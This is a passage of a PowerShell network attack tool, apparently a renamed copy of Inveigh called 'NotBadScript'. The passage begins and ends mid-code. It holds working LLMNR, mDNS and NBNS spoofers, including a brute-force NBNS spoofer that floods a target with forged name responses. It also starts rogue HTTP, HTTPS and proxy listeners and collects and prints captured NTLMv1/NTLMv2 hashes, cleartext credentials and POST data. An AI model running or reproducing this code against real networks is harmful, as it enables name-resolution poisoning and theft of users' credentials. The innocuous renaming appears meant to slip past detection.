                                    0x00,0x00,0x00,0x00

            $source_IP = $NBNS_listener_endpoint.Address.IPAddressToString
            $NBNS_query_type = [System.BitConverter]::ToString($NBNS_request_data[43..44])

            switch ($NBNS_query_type)
            {

                '41-41'
                {
                    $NBNS_query_type = "00"
                }

                '41-44'
                {
                    $NBNS_query_type = "03"
                }

                '43-41'
                {
                    $NBNS_query_type = "20"
                }

                '42-4C'
                {
                    $NBNS_query_type = "1B"
                }

                '42-4D'
                {
                    $NBNS_query_type = "1C"
                }

                '42-4E'
                {
                    $NBNS_query_type = "1D"
                }

                '42-4F'
                {
                    $NBNS_query_type = "1E"
                }

            }

            $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
            $NBNS_query = $NBNS_query -replace "-00",""
            $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
            $NBNS_query_string_subtracted = ""
            $NBNS_query_string = ""
            $n = 0

            do
            {
                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                $n += 1
            }
            until($n -gt ($NBNS_query_string_encoded.Length - 1))

            $n = 0

            do
            {
                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                $n += 2
            }
            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)

            if(!$Inspect -and ($NBNS_request_data -and $NBNS_listener_endpoint.Address.IPAddressToString -ne '255.255.255.255') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
            !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and (
            $notbadscript.spoofer_repeat -or $notbadscript.IP_capture_list -notcontains $source_IP) -and ($NBNSTypes -contains $NBNS_query_type) -and ($source_IP -ne $IP))
            {
                $NBNS_destination_endpoint = New-Object System.Net.IPEndpoint($NBNS_listener_endpoint.Address,137)
                $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
                $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)
                $NBNS_UDP_client.Close()
                $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
                $NBNS_UDP_client.Client.ReceiveTimeout = 5000
                $NBNS_response_message = "- response sent"
            }
            else
            {

                if($Inspect)
                {
                    $NBNS_response_message = "- inspect only"
                }
                elseif($NBNSTypes -notcontains $NBNS_query_type)
                {
                    $NBNS_response_message = "- disabled NBNS type"
                }
                elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $NBNS_query_string)
                {
                    $NBNS_response_message = "- $NBNS_query_string is not on reply list"
                }
                elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $NBNS_query_string)
                {
                    $NBNS_response_message = "- $NBNS_query_string is on ignore list"
                }
                elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                {
                    $NBNS_response_message = "- $source_IP is not on reply list"
                }
                elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                {
                    $NBNS_response_message = "- $source_IP is on ignore list"
                }
                elseif($notbadscript.IP_capture_list -contains $source_IP)
                {
                    $NBNS_response_message = "- previous capture from $source_IP"
                }
                elseif($source_IP -eq $IP)
                {
                    $NBNS_response_message = "- local request"
                }
                else
                {
                    $NBNS_response_message = "- something went wrong"
                }

            }

            if($NBNS_request_data)
            {
                 $notbadscript.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                }

            }

            $NBNS_request_data = ""
        }

    }

    $NBNS_UDP_client.Close()
 }

# NBNS BruteForce ScriptBlock
$NBNS_bruteforce_spoofer_scriptblock =
{
    param ($SpooferIP,$NBNSBruteForceHost,$NBNSBruteForceTarget,$NBNSBruteForcePause,$NBNSTTL)

    $NBNSBruteForceHost = $NBNSBruteForceHost.ToUpper()

    $hostname_bytes = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($NBNSBruteForceHost)
    $hostname_encoded = [System.BitConverter]::ToString($hostname_encoded)
    $hostname_encoded = $hostname_encoded.Replace("-","")
    $hostname_encoded = [System.Text.Encoding]::UTF8.GetBytes($hostname_encoded)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)

    for($i=0; $i -lt $hostname_encoded.Count; $i++)
    {

        if($hostname_encoded[$i] -gt 64)
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 10
        }
        else
        {
            $hostname_bytes[$i] = $hostname_encoded[$i] + 17
        }

    }

    $NBNS_response_packet = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            $hostname_bytes +
                            0x00,0x20,0x00,0x01 +
                            $NBNS_TTL_bytes +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00

    $notbadscript.console_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")
    $NBNS_paused = $false
    $NBNS_bruteforce_UDP_client = New-Object System.Net.Sockets.UdpClient(137)
    $destination_IP = [System.Net.IPAddress]::Parse($NBNSBruteForceTarget)
    $destination_point = New-Object Net.IPEndpoint($destination_IP,137)
    $NBNS_bruteforce_UDP_client.Connect($destination_point)

    if($notbadscript.file_output)
    {
        $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")
    }

    if($notbadscript.log_output)
    {
        $notbadscript.log.Add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget")
    }

    while($notbadscript.running)
    {

        :NBNS_spoofer_loop while (!$notbadscript.hostname_spoof -and $notbadscript.running)
        {

            if($NBNS_paused)
            {
                $notbadscript.console_queue.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")
                $NBNS_paused = $false

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")
                }

            }

            for ($i = 0; $i -lt 255; $i++)
            {

                for ($j = 0; $j -lt 255; $j++)
                {
                    $NBNS_response_packet[0] = $i
                    $NBNS_response_packet[1] = $j
                    $NBNS_bruteforce_UDP_client.send($NBNS_response_packet,$NBNS_response_packet.Length)

                    if($notbadscript.hostname_spoof -and $NBNSBruteForcePause)
                    {
                        $notbadscript.console_queue.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")
                        $NBNS_paused = $true
                        break NBNS_spoofer_loop

                        if($notbadscript.file_output)
                        {
                            $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")
                        }

                        if($notbadscript.log_output)
                        {
                            $notbadscript.log.Add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")
                        }

                    }

                }

            }

        }

        Start-Sleep -m 5
    }

    $NBNS_bruteforce_UDP_client.Close()
}

# Control Loop ScriptBlock
$control_scriptblock =
{
    param ($ConsoleQueueLimit,$NBNSBruteForcePause,$RunCount,$RunTime)

    $notbadscript.control = $true

    function StopNotBadScript
    {
        param ([String]$exit_message)

        if($notbadscript.HTTPS -and !$notbadscript.HTTPS_existing_certificate -or ($notbadscript.HTTPS_existing_certificate -and $notbadscript.HTTPS_force_certificate_delete))
        {

            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $notbadscript.certificate_issuer})

                ForEach($certificate in $certificates)
                {
                    $certificate_store.Remove($certificate)
                }

                $certificate_store.Close()
            }
            catch
            {
                $notbadscript.console_queue.Add("SSL Certificate Deletion Error - Remove Manually")

                if($notbadscript.file_output)
                {
                    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
                }

                if($notbadscript.log_output)
                {
                    $notbadscript.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
                }

            }

        }

        if($notbadscript.running)
        {
            Start-Sleep -S 1
            $notbadscript.console_queue.Add("NotBadScript exited due to $exit_message at $(Get-Date -format 's')")

            if($notbadscript.file_output)
            {
                $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - NotBadScript exited due to $exit_message")
            }

            if($notbadscript.log_output)
            {
                $notbadscript.log.Add("$(Get-Date -format 's') - NotBadScript exited due to $exit_message")
            }

            Start-Sleep -S 1
            $notbadscript.running = $false
        }

        if($notbadscript.relay_running)
        {
            Start-Sleep -S 1
            $notbadscript.console_queue.Add("NotBadScript Relay exited due to $exit_message at $(Get-Date -format 's')")

            if($notbadscript.file_output)
            {
                $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - NotBadScript Relay exited due to $exit_message")
            }

            if($notbadscript.log_output)
            {
                $notbadscript.log.Add("$(Get-Date -format 's') - NotBadScript Relay exited due to $exit_message")
            }

            Start-Sleep -S 1
            $notbadscript.relay_running = $false

        }

        $notbadscript.HTTPS = $false
    }

    if($NBNSBruteForcePause)
    {
        $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause
    }

    $run_count_NTLMv1 = $RunCount + $notbadscript.NTLMv1_list.Count
    $run_count_NTLMv2 = $RunCount + $notbadscript.NTLMv2_list.Count
    $run_count_cleartext = $RunCount + $notbadscript.cleartext_list.Count

    if($RunTime)
    {
        $control_timeout = New-TimeSpan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    while($notbadscript.running)
    {

        if($NBNSBruteForcePause -and $notbadscript.hostname_spoof)
        {

            if($notbadscript.NBNS_stopwatch.Elapsed -ge $NBNS_pause)
            {
                $notbadscript.hostname_spoof = $false
            }

        }

        if($RunCount)
        {

            if($notbadscript.NTLMv1_list.Count -ge $run_count_NTLMv1 -or $notbadscript.NTLMv2_list.Count -ge $run_count_NTLMv2 -or $notbadscript.cleartext_list.Count -ge $run_count_cleartext)
            {
                StopNotBadScript "run count"
            }

        }

        if($RunTime)
        {

            if($control_stopwatch.Elapsed -ge $control_timeout)
            {
                StopNotBadScript "run time"
            }

        }

        if($notbadscript.file_output)
        {

            while($notbadscript.log_file_queue.Count -gt 0)
            {
                $notbadscript.log_file_queue[0]|Out-File $notbadscript.log_out_file -Append
                $notbadscript.log_file_queue.RemoveAt(0)
            }

            while($notbadscript.NTLMv1_file_queue.Count -gt 0)
            {
                $notbadscript.NTLMv1_file_queue[0]|Out-File $notbadscript.NTLMv1_out_file -Append
                $notbadscript.NTLMv1_file_queue.RemoveAt(0)
            }

            while($notbadscript.NTLMv2_file_queue.Count -gt 0)
            {
                $notbadscript.NTLMv2_file_queue[0]|Out-File $notbadscript.NTLMv2_out_file -Append
                $notbadscript.NTLMv2_file_queue.RemoveAt(0)
            }

            while($notbadscript.cleartext_file_queue.Count -gt 0)
            {
                $notbadscript.cleartext_file_queue[0]|Out-File $notbadscript.cleartext_out_file -Append
                $notbadscript.cleartext_file_queue.RemoveAt(0)
            }

            while($notbadscript.POST_request_file_queue.Count -gt 0)
            {
                $notbadscript.POST_request_file_queue[0]|Out-File $notbadscript.POST_request_out_file -Append
                $notbadscript.POST_request_file_queue.RemoveAt(0)
            }

        }

        if(!$notbadscript.console_output -and $ConsoleQueueLimit -ge 0)
        {

            while($notbadscript.console_queue.Count -gt $ConsoleQueueLimit -and !$notbadscript.console_output)
            {
                $notbadscript.console_queue.RemoveAt(0)
            }

        }

        Start-Sleep -m 5
    }

    $notbadscript.control = $false
}

# End ScriptBlocks
# Begin Startup Functions

# HTTP Listener Startup Function
function HTTPListener()
{
    $proxy_listener = $false
    $HTTPS_listener = $false
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
        $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
        $HTTPResetDelay).AddArgument($HTTPResetDelayTimeout).AddArgument($HTTPResponse).AddArgument(
        $HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument($Proxy).AddArgument(
        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($WPADAuth).AddArgument(
        $WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

Start-Sleep -m 50

# HTTPS Listener Startup Function
function HTTPSListener()
{
    $proxy_listener = $false
    $HTTPS_listener = $true
    $HTTPS_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_runspace.Open()
    $HTTPS_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $HTTPS_powershell = [PowerShell]::Create()
    $HTTPS_powershell.Runspace = $HTTPS_runspace
    $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
        $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
        $HTTPResetDelay).AddArgument($HTTPResetDelayTimeout).AddArgument($HTTPResponse).AddArgument(
        $HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument($Proxy).AddArgument(
        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($WPADAuth).AddArgument(
        $WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $HTTPS_powershell.BeginInvoke() > $null
}

Start-Sleep -m 50

# Proxy Listener Startup Function
function ProxyListener()
{
    $proxy_listener = $true
    $HTTPS_listener = $false
    $proxy_runspace = [RunspaceFactory]::CreateRunspace()
    $proxy_runspace.Open()
    $proxy_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $proxy_powershell = [PowerShell]::Create()
    $proxy_powershell.Runspace = $proxy_runspace
    $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
        $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
        $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
        $HTTPResetDelay).AddArgument($HTTPResetDelayTimeout).AddArgument($HTTPResponse).AddArgument(
        $HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument($Proxy).AddArgument(
        $ProxyIgnore).AddArgument($proxy_listener).AddArgument($WPADAuth).AddArgument(
        $WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $proxy_powershell.BeginInvoke() > $null
}

# Sniffer/Spoofer Startup Function
function SnifferSpoofer()
{
    $sniffer_runspace = [RunspaceFactory]::CreateRunspace()
    $sniffer_runspace.Open()
    $sniffer_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $sniffer_powershell = [PowerShell]::Create()
    $sniffer_powershell.Runspace = $sniffer_runspace
    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($IP).AddArgument($LLMNR).AddArgument(
        $LLMNR_response_message).AddArgument($LLMNRTTL).AddArgument($mDNS).AddArgument(
        $mDNS_response_message).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument(
        $NBNS).AddArgument($NBNS_response_message).AddArgument($NBNSTypes).AddArgument($NBNSTTL).AddArgument(
        $SMB).AddArgument($SpooferHostsIgnore).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument($SpooferIPsReply).AddArgument(
        $SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument($SpooferLearningInterval) > $null
    $sniffer_powershell.BeginInvoke() > $null
}

# Unprivileged LLMNR Spoofer Startup Function
function LLMNRSpoofer()
{
    $LLMNR_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $LLMNR_spoofer_runspace.Open()
    $LLMNR_spoofer_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $LLMNR_spoofer_powershell = [PowerShell]::Create()
    $LLMNR_spoofer_powershell.Runspace = $LLMNR_spoofer_runspace
    $LLMNR_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $LLMNR_spoofer_powershell.AddScript($LLMNR_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $LLMNR_response_message).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore).AddArgument(
        $LLMNRTTL) > $null
    $LLMNR_spoofer_powershell.BeginInvoke() > $null
}

# Unprivileged mDNS Spoofer Startup Function
function mDNSSpoofer()
{
    $mDNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $mDNS_spoofer_runspace.Open()
    $mDNS_spoofer_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $mDNS_spoofer_powershell = [PowerShell]::Create()
    $mDNS_spoofer_powershell.Runspace = $mDNS_spoofer_runspace
    $mDNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $mDNS_spoofer_powershell.AddScript($mDNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $mDNS_response_message).AddArgument($mDNSTTL).AddArgument($mDNSTypes).AddArgument($SpooferIP).AddArgument(
        $SpooferHostsReply).AddArgument($SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
        $SpooferIPsIgnore) > $null
    $mDNS_spoofer_powershell.BeginInvoke() > $null
}

# Unprivileged NBNS Spoofer Startup Function
function NBNSSpoofer()
{
    $NBNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $NBNS_spoofer_runspace.Open()
    $NBNS_spoofer_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $NBNS_spoofer_powershell = [PowerShell]::Create()
    $NBNS_spoofer_powershell.Runspace = $NBNS_spoofer_runspace
    $NBNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $NBNS_spoofer_powershell.AddScript($NBNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
        $NBNS_response_message).AddArgument($SpooferIP).AddArgument($NBNSTypes).AddArgument(
        $SpooferHostsReply).AddArgument($SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
        $SpooferIPsIgnore).AddArgument($NBNSTTL) > $null
    $NBNS_spoofer_powershell.BeginInvoke() > $null
}

# NBNS Brute Force Spoofer Startup Function
function NBNSBruteForceSpoofer()
{
    $NBNS_bruteforce_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
    $NBNS_bruteforce_spoofer_runspace.Open()
    $NBNS_bruteforce_spoofer_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $NBNS_bruteforce_spoofer_powershell = [PowerShell]::Create()
    $NBNS_bruteforce_spoofer_powershell.Runspace = $NBNS_bruteforce_spoofer_runspace
    $NBNS_bruteforce_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $NBNS_bruteforce_spoofer_powershell.AddScript($NBNS_bruteforce_spoofer_scriptblock).AddArgument(
        $SpooferIP).AddArgument($NBNSBruteForceHost).AddArgument($NBNSBruteForceTarget).AddArgument(
        $NBNSBruteForcePause).AddArgument($NBNSTTL) > $null
    $NBNS_bruteforce_spoofer_powershell.BeginInvoke() > $null
}

# Control Loop Startup Function
function ControlLoop()
{
    $control_runspace = [RunspaceFactory]::CreateRunspace()
    $control_runspace.Open()
    $control_runspace.SessionStateProxy.SetVariable('notbadscript',$notbadscript)
    $control_powershell = [PowerShell]::Create()
    $control_powershell.Runspace = $control_runspace
    $control_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_powershell.AddScript($control_scriptblock).AddArgument($ConsoleQueueLimit).AddArgument(
        $NBNSBruteForcePause).AddArgument($RunCount).AddArgument($RunTime) > $null
    $control_powershell.BeginInvoke() > $null
}

# End Startup Functions

# Startup Enabled Services

# HTTP Server Start
if($HTTP -eq 'Y')
{
    HTTPListener
}

# HTTPS Server Start
if($HTTPS -eq 'Y')
{
    HTTPSListener
}

# Proxy Server Start
if($Proxy -eq 'Y')
{
    ProxyListener
}

# Sniffer/Spoofer Start
if(($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and $elevated_privilege)
{
    SnifferSpoofer
}
elseif(($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$elevated_privilege)
{

    if($LLMNR -eq 'Y')
    {
        LLMNRSpoofer
    }

    if($mDNS -eq 'Y')
    {
        mDNSSpoofer
    }

    if($NBNS -eq 'Y')
    {
        NBNSSpoofer
    }

    if($NBNSBruteForce -eq 'Y')
    {
        NBNSBruteForceSpoofer
    }

}

# NBNSBruteForce Spoofer Start
if($NBNSBruteForce -eq 'Y')
{
    NBNSBruteForceSpoofer
}

# Control Loop Start
if($ConsoleQueueLimit -ge 0 -or $notbadscript.file_output -or $NBNSBruteForcePause -or $RunCount -or $RunTime)
{
    ControlLoop
}

# Console Output Loop
try
{

    if($notbadscript.console_output)
    {

        if($ConsoleStatus)
        {
            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        }

        :console_loop while(($notbadscript.running -and $notbadscript.console_output) -or ($notbadscript.console_queue.Count -gt 0 -and $notbadscript.console_output))
        {

            while($notbadscript.console_queue.Count -gt 0)
            {

                switch -wildcard ($notbadscript.console_queue[0])
                {

                    {$_ -like "* written to *" -or $_ -like "* for relay *" -or $_ -like "*SMB relay *" -or $_ -like "* local administrator *"}
                    {

                        if($notbadscript.output_stream_only)
                        {
                            Write-Output($notbadscript.console_queue[0] + $notbadscript.newline)
                        }
                        else
                        {
                            Write-Warning($notbadscript.console_queue[0])
                        }

                        $notbadscript.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {

                            if($notbadscript.output_stream_only)
                            {
                                Write-Output($notbadscript.console_queue[0] + $notbadscript.newline)
                            }
                            else
                            {
                                Write-Output($notbadscript.console_queue[0])
                            }

                        }

                        $notbadscript.console_queue.RemoveAt(0)

                    }

                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
                    {

                        if($ConsoleOutput -ne "Low")
                        {

                            if($notbadscript.output_stream_only)
                            {
                                Write-Output($notbadscript.console_queue[0] + $notbadscript.newline)
                            }
                            else
                            {
                                Write-Output($notbadscript.console_queue[0])
                            }

                        }

                        $notbadscript.console_queue.RemoveAt(0)

                    }

                    default
                    {

                        if($notbadscript.output_stream_only)
                        {
                            Write-Output($notbadscript.console_queue[0] + $notbadscript.newline)
                        }
                        else
                        {
                            Write-Output($notbadscript.console_queue[0])
                        }

                        $notbadscript.console_queue.RemoveAt(0)
                    }

                }

            }

            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
            {

                if($notbadscript.cleartext_list.Count -gt 0)
                {
                    Write-Output("$(Get-Date -format 's') - Current unique cleartext captures:" + $notbadscript.newline)
                    $notbadscript.cleartext_list.Sort()

                    foreach($unique_cleartext in $notbadscript.cleartext_list)
                    {
                        if($unique_cleartext -ne $unique_cleartext_last)
                        {
                            Write-Output($unique_cleartext + $notbadscript.newline)
                        }

                        $unique_cleartext_last = $unique_cleartext
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("$(Get-Date -format 's') - No cleartext credentials have been captured" + $notbadscript.newline)
                }

                if($notbadscript.POST_request_list.Count -gt 0)
                {
                    Write-Output("$(Get-Date -format 's') - Current unique POST request captures:" + $notbadscript.newline)
                    $notbadscript.POST_request_list.Sort()

                    foreach($unique_POST_request in $notbadscript.POST_request_list)
                    {
                        if($unique_POST_request -ne $unique_POST_request_last)
                        {
                            Write-Output($unique_POST_request + $notbadscript.newline)
                        }

                        $unique_POST_request_last = $unique_POST_request
                    }

                    Start-Sleep -m 5
                }

                if($notbadscript.NTLMv1_list.Count -gt 0)
                {
                    Write-Output("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures:" + $notbadscript.newline)
                    $notbadscript.NTLMv1_list.Sort()

                    foreach($unique_NTLMv1 in $notbadscript.NTLMv1_list)
                    {
                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
                        {
                            Write-Output($unique_NTLMv1 + $notbadscript.newline)
                        }

                        $unique_NTLMv1_account_last = $unique_NTLMv1_account
                    }

                    $unique_NTLMv1_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames:" + $notbadscript.newline)

                    foreach($NTLMv1_username in $notbadscript.NTLMv1_username_list)
                    {
                        Write-Output($NTLMv1_username + $notbadscript.newline)
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured" + $notbadscript.newline)
                }

                if($notbadscript.NTLMv2_list.Count -gt 0)
                {
                    Write-Output("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures:" + $notbadscript.newline)
                    $notbadscript.NTLMv2_list.Sort()

                    foreach($unique_NTLMv2 in $notbadscript.NTLMv2_list)
                    {
                        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
                        {
                            Write-Output($unique_NTLMv2 + $notbadscript.newline)
                        }

                        $unique_NTLMv2_account_last = $unique_NTLMv2_account
                    }

                    $unique_NTLMv2_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames:" + $notbadscript.newline)

                    foreach($NTLMv2_username in $notbadscript.NTLMv2_username_list)
                    {
                        Write-Output($NTLMv2_username + $notbadscript.newline)
                    }

                }
                else
                {
                    Write-Output("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured" + $notbadscript.newline)
                }

                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

            }

            if($notbadscript.console_input)
            {

                if([Console]::KeyAvailable)
                {
                    $notbadscript.console_output = $false
                    BREAK console_loop
                }

            }

            Start-Sleep -m 5
        }

    }

}
finally
{

    if($Tool -eq 2)
    {
        $notbadscript.running = $false
    }

}

}
#End Invoke-NotBadScript

function Stop-NotBadScript
{
<#
.SYNOPSIS
Stop-NotBadScript will stop all running NotBadScript functions.
#>

if($notbadscript)
{

    if($notbadscript.running -or $notbadscript.relay_running)
    {

        if($notbadscript.HTTPS -and !$notbadscript.HTTPS_existing_certificate -or ($notbadscript.HTTPS_existing_certificate -and $notbadscript.HTTPS_force_certificate_delete))
        {

            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $notbadscript.certificate_issuer})

                ForEach($certificate in $certificates)
                {
                    $certificate_store.Remove($certificate)
                }

                $certificate_store.Close()
            }
            catch
            {
                Write-Output("SSL Certificate Deletion Error - Remove Manually")

                if($notbadscript.file_output)
                {
